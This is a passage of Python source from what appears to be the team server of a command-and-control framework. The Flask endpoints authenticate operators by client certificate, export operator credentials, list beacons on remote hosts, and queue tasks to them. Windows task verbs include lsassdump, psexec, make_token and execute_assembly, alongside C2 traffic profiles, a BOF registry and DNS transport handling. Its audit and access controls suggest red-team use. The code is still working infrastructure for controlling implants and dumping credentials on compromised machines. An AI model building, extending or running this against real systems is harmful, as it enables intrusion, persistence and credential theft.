                            hashes as _hashes, serialization as _ser,
                        )
                        from cryptography.hazmat.primitives.asymmetric \
                            import ec as _ec
                        sig_bytes = key.sign(
                            canonical, _ec.ECDSA(_hashes.SHA256()))
                        pub_pem = key.public_key().public_bytes(
                            encoding=_ser.Encoding.PEM,
                            format=_ser.PublicFormat.SubjectPublicKeyInfo,
                        )
                        signer_desc = f"handler.{attr} (cryptography key)"
                        break
                    except Exception as exc:
                        last_err = (f"handler.{attr} (cryptography key): "
                                    f"{type(exc).__name__}: {exc}")
                        continue

            if sig_bytes is not None and pub_pem is not None:
                cfg_out['config_signature_b64'] = (
                    _b64_sig.b64encode(sig_bytes).decode('ascii'))
                if isinstance(pub_pem, bytes):
                    pub_pem = pub_pem.decode('utf-8')
                cfg_out['config_signer_pubkey_pem'] = pub_pem
                try:
                    print(f"[TEAM] config signed with {signer_desc}",
                          flush=True)
                except Exception:
                    pass
            else:
                try:
                    print("[TEAM] config signing skipped: no usable "
                          "signer found on the handler — the "
                          "exported config will load unsigned on "
                          "the client", flush=True)
                    if last_err:
                        print(f"[TEAM]   last probe: {last_err}",
                              flush=True)
                except Exception:
                    pass

        except Exception as exc:
            try:
                print(f"[TEAM] config signing skipped: "
                      f"{type(exc).__name__}: {exc}", flush=True)
            except Exception:
                pass

        return json.dumps(cfg_out, indent=2), None

    def _operators_export(self, name, role, ip):
        """Return another operator's client config as a base64 blob.

        The config is the same JSON blob the local console writes:
        name, role, server_host, server_port, and the three PEM
        certificates. Anyone who holds the blob can authenticate as
        the target operator, so this is a credential handoff.

        Three tiers:

          * Self-export is allowed for any authenticated operator.
          * Exporting another viewer or operator requires
            `operator.export.other`, which is admin-only.
          * Exporting an admin requires the LOCAL_ONLY
            `operator.export.other.admin` capability, which no
            remote caller can hold.

        The response is base64 because the blob contains PEM
        material with embedded newlines. `sha256` is the digest of
        the decoded bytes, so the caller can verify what it wrote
        and the operator's audit log records an exact fingerprint
        of the credential that was handed out.
        """
        payload = request.get_json(force=True, silent=True) or {}
        target = (payload.get('name') or '').strip()

        if not target:
            target = name

        # --- Tier 1: is this a self-export? ---------------------------
        if target != name:
            # Tier 2: exporting someone else needs the other cap.
            if not constants.has_capability(
                    role, 'operator.export.other', is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.export', target=target,
                    outcome='denied',
                    detail='role lacks operator.export.other')
                resp = jsonify({
                    'error': ('exporting another operator\'s '
                              'config requires admin'),
                    'audit_id': audit_id})
                resp.status_code = 403
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        # --- Look up the target ---------------------------------------
        try:
            entry = self.registry.get(target)
        except Exception:
            entry = None
        if entry is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.export', target=target,
                outcome='error', detail='not found')
            resp = jsonify({'error': f'{target} not found',
                            'audit_id': audit_id})
            resp.status_code = 404
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        if entry.get('revoked'):
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.export', target=target,
                outcome='error',
                detail='target is revoked')
            resp = jsonify({
                'error': f'{target} is revoked; refusing to export',
                'audit_id': audit_id})
            resp.status_code = 400
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        # --- Tier 3: is the target an admin? --------------------------
        if entry.get('role') == 'admin' and target != name:
            # Exporting another admin requires LOCAL_ONLY.
            if not constants.has_capability(
                    role, 'operator.export.other.admin',
                    is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='operator.export', target=target,
                    outcome='denied',
                    detail=('exporting another admin\'s config '
                            'requires the local console'))
                resp = jsonify({
                    'error': ('exporting an admin config requires '
                              'the local console on the team '
                              'server machine'),
                    'audit_id': audit_id})
                resp.status_code = 403
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        # --- Build the config blob -----------------------------------
        blob, build_err = self._build_operator_config(target, entry)
        if blob is None:
            status = 409 if (build_err
                             and 'CA was regenerated' in build_err) \
                     else 500
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='operator.export', target=target,
                outcome='error',
                detail=(build_err or 'could not build config')[:200])
            resp = jsonify({
                'error':    build_err or 'could not build config',
                'audit_id': audit_id,
            })
            resp.status_code = status
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        raw_bytes = blob.encode('utf-8')
        digest = hashlib.sha256(raw_bytes).hexdigest()

        # --- Audit ----------------------------------------------------

        audit_detail = f'sha256={digest}'
        if target == name:
            audit_detail += ' (self)'
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='operator.export', target=target,
            detail=audit_detail)

        import base64 as _b64
        resp = jsonify({
            'name':    target,
            'role':    entry.get('role', 'operator'),
            'config_b64': _b64.b64encode(raw_bytes).decode('ascii'),
            'sha256':  digest,
            'bytes':   len(raw_bytes),
            'audit_id': audit_id,
        })
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # Identity / authorization gate

    def _extract_peer(self) -> Tuple[Optional[str], Optional[str], str]:
        """Return (cn, role, source_ip), or (None, None, ip) if the
        peer cert is missing, unparseable, or the operator is
        revoked."""
        ip = request.remote_addr or '?'
        request.environ['tornado.auth_error'] = 'cert'
        sock = request.environ.get('werkzeug.socket')
        if sock is None:
            return None, None, ip
        try:
            der = sock.getpeercert(binary_form=True)
        except Exception:
            return None, None, ip
        if not der:
            return None, None, ip
        cn = self.registry.verify_cert(der)
        if not cn:
            request.environ['tornado.auth_error'] = 'cert'
            return None, None, ip
        entry = self.registry.get(cn)
        if entry is None:
            request.environ['tornado.auth_error'] = 'unknown_operator'
            return None, None, ip
        if entry.get('revoked'):
            request.environ['tornado.auth_error'] = 'revoked'
            return None, None, ip

        if entry.get('auth_hash'):
            ts = request.headers.get('X-Operator-Ts', '')
            nonce = request.headers.get('X-Operator-Nonce', '')
            mac = request.headers.get('X-Operator-Mac', '')
            if not (ts and nonce and mac):
                request.environ['tornado.auth_error'] = \
                    'password_required'
                return None, None, ip

            try:
                ok = self.registry.verify_auth(
                    cn, request.path, ts, nonce, mac)
            except Exception:
                request.environ['tornado.auth_error'] = \
                    'password_invalid'
                return None, None, ip
            if not ok:
                request.environ['tornado.auth_error'] = \
                    'password_invalid'
                return None, None, ip

            try:
                ts_float = float(ts)
            except (TypeError, ValueError):
                request.environ['tornado.auth_error'] = \
                    'password_invalid'
                return None, None, ip
            if not _nonce_accept(cn, nonce, ts_float):
                request.environ['tornado.auth_error'] = \
                    'password_invalid'
                return None, None, ip

        with _seen_lock:
            now_mono = time.monotonic()
            first_seen = _seen_certs.get(cn)
            if first_seen is None:
                _seen_certs[cn] = now_mono
                request.environ['tornado.session_opened'] = True
            elif now_mono - first_seen > SESSION_TTL_SECONDS:
                _seen_certs.pop(cn, None)
                request.environ['tornado.auth_error'] = \
                    'session_expired'
                return None, None, ip

        handler_obj = getattr(self.engine, 'handler', None)
        if handler_obj is not None:
            touch = getattr(handler_obj, '_touch_activity', None)
            if touch is not None:
                try:
                    touch(f'remote:{cn}')
                except Exception:
                    pass

        return cn, entry.get('role', 'viewer'), ip

    def _with_cap(self, capability: str, handler,
                  skip_rate_limit: bool = False):
        """Enforce a capability and call the handler. The handler
        receives (name, role, ip).

        `skip_rate_limit=True` is used only for blocking long-poll
        endpoints, whose natural request pattern is many small
        sequential requests over a single operator action. Charging
        each poll against the bucket makes the limiter unusable on
        a slow beacon.

        Every handler runs inside a try/except. An unhandled
        exception produces a JSON 500 with an audit entry rather
        than Flask's default HTML error page — the client's
        transport reads the body with `json.loads`, and an HTML
        body surfaces as the useless "Expecting value: line 1
        column 1 (char 0)" that tells the operator nothing about
        what went wrong.
        """

        ip_hint = request.remote_addr or '?'
        if not skip_rate_limit and not _preauth_rate_allowed(ip_hint):
            return Response(status=429)

        name, role, ip = self._extract_peer()
        if name is None:
            return self._auth_failed_response()

        if not skip_rate_limit and not _rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action=capability, outcome='throttled',
                detail='general API rate limit')
            resp = jsonify({
                'error': 'general API rate limit exceeded',
                'hint': (f'{constants.RATE_PER_SEC}/sec sustained, '
                         f'{constants.RATE_BURST} burst'),
            })
            resp.status_code = 429
            return resp

        if not _concurrent_acquire(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action=capability, outcome='throttled',
                detail=f'>{MAX_CONCURRENT_PER_OPERATOR} in-flight '
                       f'requests')
            resp = jsonify({
                'error': 'too many concurrent requests',
                'hint': (f'limit is {MAX_CONCURRENT_PER_OPERATOR} '
                         f'in-flight per operator'),
            })
            resp.status_code = 429
            return resp

        try:
            if not constants.has_capability(role, capability,
                                           is_local=False):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action=capability, outcome='denied',
                    detail='role lacks capability or capability is '
                           'local-only')
                resp = jsonify({
                    'error': (f'role {role!r} lacks capability '
                              f'{capability!r}'),
                    'audit_id': audit_id,
                })
                resp.status_code = 403
                resp.headers['X-Audit-Id'] = audit_id
                return resp

            if request.environ.pop('tornado.session_opened', False):
                self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='session.open',
                    detail=f'first request from this cert in this '
                           f'process (capability={capability})')

            try:
                return handler(name, role, ip)
            except Exception as exc:
                import traceback
                tb = traceback.format_exc()
                try:
                    print(f"[TEAM] {capability} raised: "
                          f"{type(exc).__name__}: {exc}\n{tb}",
                          flush=True)
                except Exception:
                    pass
                try:
                    audit_id = self.audit.write(
                        operator=name, role=role, source_ip=ip,
                        action=capability, outcome='error',
                        detail=(f'unhandled {type(exc).__name__}: '
                                f'{exc}')[:200])
                except Exception:
                    audit_id = None
                body = {
                    'error': (f'internal error: '
                              f'{type(exc).__name__}: {exc}'),
                }
                if audit_id:
                    body['audit_id'] = audit_id
                resp = jsonify(body)
                resp.status_code = 500
                if audit_id:
                    resp.headers['X-Audit-Id'] = audit_id
                return resp
        finally:
            _concurrent_release(name)

    @staticmethod
    def _auth_failed_response():
        """Return a 401 with a body that says which check failed.

        The client's connection-error classifier reads the JSON
        body and routes the operator to the right fix. A bare 401
        with no body forces every failure to look like a bad cert,
        which is wrong for password-protected operators.
        """
        reason = request.environ.get('tornado.auth_error', 'cert')
        messages = {
            'cert': ('client certificate missing or not signed by '
                     'the team CA'),
            'unknown_operator': ('certificate is valid but the '
                                 'operator is not in the registry — '
                                 'ask an admin to run `operators add`'),
            'revoked': 'operator has been revoked',
            'password_required': (
                'this operator requires a password, but the '
                'request did not carry the HMAC headers. '
                'Re-export the config with `operators export` on '
                'a current server, then run the client again.'),
            'password_invalid': (
                'operator password was rejected — either the '
                'password is incorrect, or the request timestamp '
                'is outside the +/- 300-second window (check the '
                'clocks on the client and the server)'),
            'session_expired': (
                'session exceeded the server\'s maximum age — '
                'reconnect to start a fresh session. If the '
                'operator has a password, the client will prompt '
                'for it again.'),
        }
        msg = messages.get(reason, 'authentication failed')
        resp = jsonify({'error': msg, 'auth_error': reason})
        resp.status_code = 401
        return resp

    def _err_400(self, name, role, ip, action, message):
        """Return a 400 with an audit entry.

        Shared by the operator-console feature handlers (creds,
        notes, webhooks) so a validation failure is written to the
        audit chain with the same shape as a success.
        """
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action=action, outcome='error',
            detail=message[:200])
        resp = jsonify({'error': message, 'audit_id': audit_id})
        resp.status_code = 400
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # Endpoints

    def _identify(self):
        name, role, ip = self._extract_peer()
        if name is None:
            return self._auth_failed_response()
        if not _rate_allowed(name):
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='identify', outcome='throttled',
                detail='general API rate limit')
            return Response(status=429)
            
        caps = sorted(
            c for c in constants.ROLE_CAPABILITIES.get(role, [])
            if constants.has_capability(role, c, is_local=False))

        handler = getattr(self.engine, 'handler', None)
        tunnel_port = None
        quic_port = None
        beacon_port = None
        if handler is not None:
            listener = getattr(handler, '_client_tunnel', None)
            if listener is not None:
                tunnel_port = listener.port

            quic_port = getattr(handler, 'quic_port', None)
            beacon_port = getattr(handler, 'beacon_port', None)
        return jsonify({
            'name': name,
            'role': role,
            'capabilities': caps,
            'server_version': '1.0.0',
            'client_tunnel_port': tunnel_port,
            'quic_port': quic_port,
            'beacon_port': beacon_port,
        })

    def _beacons_list(self, name, role, ip):
        payload = request.get_json(force=True, silent=True) or {}
        if 'current' in payload:
            raw = payload.get('current')
            if raw is None:
                with _viewer_lock:
                    for key in [k for k in _viewers
                                if k[1] == name]:
                        _viewers.pop(key, None)
            else:
                try:
                    bid = int(raw)
                except (TypeError, ValueError):
                    bid = None
                if bid is not None:
                    _viewer_record(bid, name)

        aliases = (self.aliases.all()
                   if self.aliases is not None else {})
        beacons = []
        for s in self.engine.list_all():
            a = aliases.get(str(s.id), {}) or {}
            viewers = _viewer_snapshot(s.id)
            others = [v for v in viewers if v['name'] != name]
            beacons.append({
                'id': s.id,
                'display_name': s.display_name,
                'alias': a.get('alias', '') or '',
                'tags': list(a.get('tags', []) or []),
                'os': s.identity.get('os', '?'),
                'arch': s.identity.get('arch', ''),
                'sleep_interval': s.sleep_interval,
                'jitter': s.jitter,
                'last_seen_age': s.age,
                'checkins': s.checkins,
                'last_addr': s.last_addr or '',
                'alive': s.alive,
                'viewers': others,
                'viewer_count': len(others),
            })

        return jsonify(beacons)

    def _beacon_task(self, name, role, ip, bid):
        payload = request.get_json(force=True, silent=True) or {}
        verb = payload.get('verb', '')
        args = payload.get('args', [])
        if not verb:
            return Response(status=400)

        _OS_SPECIFIC_VERBS = {
            'bof':               'windows',
            'execute_assembly':  'windows',
            'psexec':            'windows',
            'enablepriv':        'windows',
            'lsassdump':         'windows',
            'screenshot':        'windows',
            'make_token':        'windows',
            'rev2self':          'windows',
            'runas':             'windows',
        }
        required_os = _OS_SPECIFIC_VERBS.get(verb)
        if required_os:
            session = self.engine.get(bid)
            if session is None:
                return Response(status=404)
            actual_os = (session.identity or {}).get('os', '?')
            if actual_os != required_os:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='beacon.use', target=f'#{bid}',
                    outcome='denied',
                    detail=(f'{verb} requires {required_os}; '
                            f'beacon is {actual_os}'))
                resp = jsonify({
                    'error': (f'verb {verb!r} requires a '
                              f'{required_os} beacon; #{bid} '
                              f'reports os={actual_os!r}'),
                    'audit_id': audit_id,
                })
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        if not isinstance(args, list) or not all(
                isinstance(a, str) for a in args):
            return Response(status=400)

        MAX_TASK_ARG_BYTES   = 16 * 1024 * 1024
        MAX_TASK_TOTAL_BYTES = 32 * 1024 * 1024
        if len(args) > 100:
            return Response(status=413)
        if any(len(a) > MAX_TASK_ARG_BYTES for a in args):
            return Response(status=413)
        if sum(len(a) for a in args) > MAX_TASK_TOTAL_BYTES:
            return Response(status=413)

        try:
            timeout = int(payload.get('timeout', 120))
        except (TypeError, ValueError):
            return Response(status=400)
        timeout = max(1, min(timeout, 900))

        session = self.engine.get(bid)
        if session is not None and \
                getattr(session, 'transport', None) == 'dns':
            import json as _json

            est_task = {
                'id':        '00000000',
                'verb':      verb,
                'args':      list(args),
                'timeout':   timeout,
                'signature': 'A' * 96,
            }
            est_json = _json.dumps(
                [est_task], separators=(',', ':')).encode('utf-8')
            est_b64 = (len(est_json) + 2) // 3 * 4
            if est_b64 > 400:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='beacon.use', target=f'#{bid}',
                    outcome='denied',
                    detail=(f'{verb} too large for DNS transport '
                            f'(estimated {est_b64} base64url chars; '
                            f'DNS UDP reply fits ~400)'))
                resp = jsonify({
                    'error': (f'task {verb!r} is too large for the '
                              f'DNS transport (#{bid} is on DNS); '
                              f'rebuild the beacon with http or '
                              f'http,dns to use payload-carrying '
                              f'verbs'),
                    'audit_id': audit_id,
                })
                resp.status_code = 413
                resp.headers['X-Audit-Id'] = audit_id
                return resp

        if verb in ('sleep', 'workhours'):
            session = self.engine.get(bid)
            if session is None:
                return Response(status=404)
            try:
                text = self._apply_local_verb(session, verb, args)
            except ValueError as exc:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action=f'beacon.{verb}', target=f'#{bid}',
                    outcome='error', detail=str(exc))
                resp = jsonify({'error': str(exc),
                                'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp
            detail = verb + (' ' + ' '.join(args) if args else '')
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action=f'beacon.{verb}', target=f'#{bid}',
                detail=detail)
            import base64 as _b64
            resp = jsonify({
                'task_id': None,
                'queued': False,
                'applied': True,
                'ready': True,
                'output': _b64.b64encode(text.encode()).decode(),
                'error': None,
                'exit_code': 0,
                'audit_id': audit_id,
            })
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        task_id = self.engine.enqueue(bid, verb, args,
                                      timeout=timeout,
                                      queued_by=name)
        if task_id is None:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.use', target=f'#{bid}',
                outcome='error',
                detail=f'{verb} — enqueue failed (queue full)')
            resp = jsonify({'error': 'enqueue failed'})
            resp.status_code = 500
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        detail = verb
        if args:
            detail += ' ' + ' '.join(str(a) for a in args)
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.use', target=f'#{bid}',
            detail=detail[:512])
        resp = jsonify({'task_id': task_id, 'queued': True,
                        'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _beacon_result(self, name, role, ip, bid, tid):
        payload = request.get_json(force=True, silent=True) or {}
        try:
            wait = float(payload.get('wait', 0.0))
        except (TypeError, ValueError):
            return Response(status=400)

        wait = max(0.0, min(wait, 5.0))
        result = self.engine.await_result(bid, tid, timeout=wait)
        if result is None:
            return jsonify({'ready': False})
        import base64
        return jsonify({
            'ready': True,
            'task_id': tid,
            'output': base64.b64encode(result.output).decode('ascii'),
            'error': result.error,
            'exit_code': result.exit_code,
        })

    # ------------------------------------------------------------------
    # Session management endpoints

    def _graph_view(self, name, role, ip):
        from ..beacon.graph import Graph
        import re as _re

        payload = request.get_json(force=True, silent=True) or {}
        mode = (payload.get('mode') or 'tree').lower()

        g = Graph(self.engine)

        if mode == 'path':
            try:
                src = int(payload['src'])
                dst = int(payload['dst'])
            except (KeyError, ValueError, TypeError):
                return jsonify({'text': '', 'error': 'invalid ids'})
            path = g.find_path(src, dst)
            if path is None:
                text = (f"no shared-attribute path between "
                        f"#{src} and #{dst}")
            else:
                lines = [f"PATH #{src} → #{dst}"]
                for i, nid in enumerate(path):
                    prefix = '  ' if i == 0 else '  → '
                    lines.append(f"{prefix}#{nid}")
                text = '\n'.join(lines)
        else:
            blank = {k: '' for k in
                     ('dim', 'cyan', 'bold', 'green', 'red',
                      'yellow', 'magenta', 'blue', 'end')}
            text = g.render_ascii(blank, mode=mode)

        text = _re.sub(r'\033\[[0-9;]*m', '', text)
        return jsonify({'text': text})

    def _beacon_forget(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        try:
            self.engine.forget(bid)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.forget', target=f'#{bid}',
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'ok': False,
                            'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 500
            return resp
        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.forget', target=f'#{bid}')
        return jsonify({'ok': True, 'audit_id': audit_id})

    def _beacon_tasks(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        return jsonify({'pending': session.list_pending()})

    def _beacon_cancel(self, name, role, ip, bid, tid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        try:
            ok, reason = self.engine.cancel(
                bid, tid, requester=name, role=role)
        except Exception as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.cancel', target=f'#{bid}',
                outcome='error', detail=str(exc)[:200])
            resp = jsonify({'ok': False, 'error': str(exc),
                            'audit_id': audit_id})
            resp.status_code = 500
            return resp

        if ok:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.cancel', target=f'#{bid}',
                outcome='ok', detail=f'task={tid}')
            resp = jsonify({'ok': True, 'audit_id': audit_id})
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        messages = {
            'not_found': ('no pending task with that id — it may '
                          'have already completed'),
            'not_owner': ('only the operator who queued this '
                          'task can cancel it'),
            'no_session': 'beacon not found',
            'internal':   'cancel failed internally',
        }
        msg = messages.get(reason, reason or 'cancel failed')
        if reason == 'not_found':
            status = 404
        elif reason == 'not_owner':
            status = 403
        else:
            status = 400

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='beacon.cancel', target=f'#{bid}',
            outcome='denied' if reason == 'not_owner' else 'error',
            detail=f'task={tid} reason={reason}')
        resp = jsonify({
            'ok':     False,
            'error':  msg,
            'reason': reason,
            'audit_id': audit_id,
        })
        resp.status_code = status
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _beacon_schedule(self, name, role, ip, bid):
        session = self.engine.get(bid)
        if session is None:
            return Response(status=404)
        sched = getattr(self.engine, 'scheduler', None)
        if sched is None:
            return jsonify({'ok': False,
                            'error': 'scheduler unavailable'})

        payload = request.get_json(force=True, silent=True) or {}
        op = (payload.get('op') or 'list').lower()

        if op == 'list':
            now = time.time()
            rows = []
            for s in sched.list():
                if s.session_id != bid:
                    continue
                rows.append({
                    'id':       s.id,
                    'verb':     s.verb,
                    'args':     list(s.args),
                    'interval': s.interval,
                    'runs':     s.runs,
                    'keep':     getattr(s, 'keep', 0),
                    'outputs':  len(getattr(s, 'outputs', []) or []),
                    'next_in':  max(0, int(s.next_fire - now)),
                })
            return jsonify({'schedules': rows})

        if op == 'remove':
            sid = payload.get('id')
            if not sid:
                return jsonify({'ok': False,
                                'error': 'missing id'})
            s = sched.get(sid)
            if s is None or s.session_id != bid:
                return jsonify({'ok': False,
                                'error': 'unknown schedule'})
            sched.remove(sid)
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.schedule.remove',
                target=f'#{bid}', detail=f'id={sid}')
            return jsonify({'ok': True})

        if op == 'add':
            from ..beacon.scheduler import parse_interval
            spec = payload.get('interval') or ''
            verb = payload.get('verb') or ''
            args = payload.get('args') or []
            if not verb:
                return jsonify({'ok': False,
                                'error': 'missing verb'})
            secs = parse_interval(spec)
            if secs is None:
                return jsonify({
                    'ok': False,
                    'error': 'invalid interval '
                             '(use 30s / 5m / 2h / 1d)'})
            try:
                keep = int(payload.get('keep') or 0)
            except (TypeError, ValueError):
                keep = 0
            keep = max(0, min(keep, 10000))
            s = sched.add(bid, verb, args, secs, keep=keep)
            self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='beacon.schedule.add',
                target=f'#{bid}',
                detail=f'id={s.id} interval={secs} '
                       f'keep={keep} '
                       f'verb={verb} '
                       f'{" ".join(str(a) for a in args)}')
            return jsonify({'ok': True,
                            'id': s.id,
                            'interval': secs,
                            'keep': keep})

        if op == 'output':
            sid = payload.get('id')
            if not sid:
                return jsonify({'ok': False,
                                'error': 'missing id'})
            s = sched.get(sid)
            if s is None or s.session_id != bid:
                return jsonify({'ok': False,
                                'error': 'unknown schedule'})
            run = payload.get('run')
            outputs = getattr(s, 'outputs', []) or []
            if run is not None:
                try:
                    run_i = int(run)
                except (TypeError, ValueError):
                    return jsonify({'ok': False,
                                    'error': 'invalid run'})
                outputs = [o for o in outputs
                           if o.get('run') == run_i]
            return jsonify({'ok': True, 'outputs': outputs})

        return jsonify({'ok': False,
                        'error': f'unknown op {op!r}'})

    # ------------------------------------------------------------------
    # Command catalogue

    def _commands_list(self, name, role, ip):
        """Return the command catalogue filtered by the operator's
        role, plus their live capabilities.

        The client caches the response at banner time and uses it to
        build tab completion, the help menu, and the dispatch table.
        Adding a command server-side requires no client change.
        """
        from . import commands as commands_mod

        caps = frozenset(
            c for c in constants.ROLE_CAPABILITIES.get(
                role, frozenset())
            if constants.has_capability(role, c, is_local=False))

        payload = request.get_json(force=True, silent=True) or {}
        target_os = payload.get('target_os') or None

        filtered = commands_mod.filter_for(role, caps, target_os)

        categories = {
            'beacon': commands_mod.categories_for(
                filtered.get('beacon', [])),
        }

        return jsonify({
            'main':       filtered.get('main', []),
            'beacon':     filtered.get('beacon', []),
            'categories': categories,
        })

    # ------------------------------------------------------------------
    # C2 profile catalogue

    def _c2_profiles(self, name, role, ip):
        """Return every C2 profile this server can build agents
        against, or the full JSON of one named profile.

        Request body:
            {}                    — list all profiles (summary view)
            {"name": "<profile>"} — return the raw JSON of one

        The summary view carries the fields an operator needs to
        decide which profile to pick: the three request paths, the
        User-Agent, whether the profile carries a shaping block,
        and the profile's own `description` field if the JSON author
        supplied one. The full view returns the raw profile so an
        operator can copy it as a starting point for a new one.

        The endpoint never reveals file paths on the server, and it
        refuses any `name` that is not a bare stem — a `name` with a
        path separator is rejected the same way `_load_build_config`
        rejects one for the `c2_profile` field itself.
        """
        try:
            from ..beacon.builder import (
                list_c2_profiles, load_c2_profile,
            )
        except ImportError as exc:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='c2.profiles', outcome='error',
                detail=f'builder unavailable: {exc}')
            resp = jsonify({'error': 'builder unavailable',
                            'audit_id': audit_id})
            resp.status_code = 503
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        payload = request.get_json(force=True, silent=True) or {}
        requested = (payload.get('name') or '').strip()

        # ---- Single-profile view -------------------------------------
        if requested:
            if '/' in requested or '\\' in requested \
                    or requested.startswith('.'):
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='c2.profiles', target=requested[:32],
                    outcome='denied',
                    detail='name must be a bare stem')
                resp = jsonify({
                    'error': 'profile name must be a bare stem, '
                             'not a path',
                    'audit_id': audit_id})
                resp.status_code = 400
                resp.headers['X-Audit-Id'] = audit_id
                return resp

            prof = load_c2_profile(requested)
            if prof is None:
                audit_id = self.audit.write(
                    operator=name, role=role, source_ip=ip,
                    action='c2.profiles', target=requested[:32],
                    outcome='error', detail='not found')
                resp = jsonify({
                    'error': f'profile {requested!r} not found',
                    'audit_id': audit_id})
                resp.status_code = 404
                resp.headers['X-Audit-Id'] = audit_id
                return resp

            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='c2.profiles', target=requested[:32],
                outcome='ok', detail='full view')
            resp = jsonify({
                'name':     requested,
                'profile':  prof,
                'audit_id': audit_id,
            })
            resp.headers['X-Audit-Id'] = audit_id
            return resp

        # ---- List view -----------------------------------------------
        names = list_c2_profiles()
        rows = []
        for n in names:
            prof = load_c2_profile(n) or {}
            shaping = prof.get('shaping') or {}
            shape_kinds = sorted(shaping.keys()) if shaping else []
            rows.append({
                'name':             n,
                'description':      prof.get('description', '') or '',
                'user_agent':       prof.get('user_agent', '') or '',
                'linux_user_agent':
                    prof.get('linux_user_agent', '') or '',
                'beacon_path':      prof.get('beacon_path', '/beacon'),
                'tasks_path':       prof.get('tasks_path', '/tasks'),
                'results_path':     prof.get('results_path', '/results'),
                'extra_headers':    prof.get('extra_headers') or {},
                'request_headers':  prof.get('request_headers') or {},
                'has_shaping':      bool(shaping),
                'shaping_kinds':    shape_kinds,
            })

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='c2.profiles', outcome='ok',
            detail=f'{len(rows)} profiles')
        resp = jsonify({'profiles': rows, 'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    # ------------------------------------------------------------------
    # BOF registry

    def _bofs_list(self, name, role, ip):
        """Return every registered BOF with its metadata.

        The blob bytes are not returned — an operator who wants the
        bytes fetches them by name at task-dispatch time. Listing is
        a metadata read, not a download.
        """
        from ..beacon import bof_registry

        entries = bof_registry.list_all()
        rows = []
        for bname, meta in sorted(entries.items()):
            rows.append({
                'name':        bname,
                'sha256':      meta.get('sha256', ''),
                'size':        meta.get('size', 0),
                'arch':        meta.get('arch', '?'),
                'format':      meta.get('format', ''),
                'description': meta.get('description', ''),
                'source':      meta.get('source', ''),
                'origin':      meta.get('origin', ''),
                'missing':     bool(meta.get('missing')),
            })

        audit_id = self.audit.write(
            operator=name, role=role, source_ip=ip,
            action='bof.list', outcome='ok',
            detail=f'{len(rows)} registered')
        resp = jsonify({'bofs': rows, 'audit_id': audit_id})
        resp.headers['X-Audit-Id'] = audit_id
        return resp

    def _bofs_add(self, name, role, ip):
        """Register a BOF.

        The client reads the file locally and uploads its bytes as
        base64. The server never reads a path the client names —
        same posture as the build manager, where the client sends
        config and the server reads only whitelisted paths.

        Body:
            {
              "name":        "whoami",
              "data_b64":    "<base64 of the .o bytes>",
              "format":      "z",                 # optional
              "description": "...",               # optional
              "source":      "whoami.x64.o",      # optional
              "replace":     true                 # optional
            }

        When `replace` is false and the name already exists, the
        request is refused with 409. The default is to refuse so an
        operator cannot silently overwrite a teammate's BOF.
        """
        from ..beacon import bof_registry

        payload = request.get_json(force=True, silent=True) or {}
        bname = (payload.get('name') or '').strip()
        data_b64 = payload.get('data_b64') or ''
        fmt = (payload.get('format') or '')[:64]
        description = _sanitize_chat_text(
            (payload.get('description') or '')[:256])
        source = _sanitize_chat_text(
            (payload.get('source') or '')[:256])
        replace = bool(payload.get('replace'))

        if not bname:
            audit_id = self.audit.write(
                operator=name, role=role, source_ip=ip,
                action='bof.add', outcome='error',
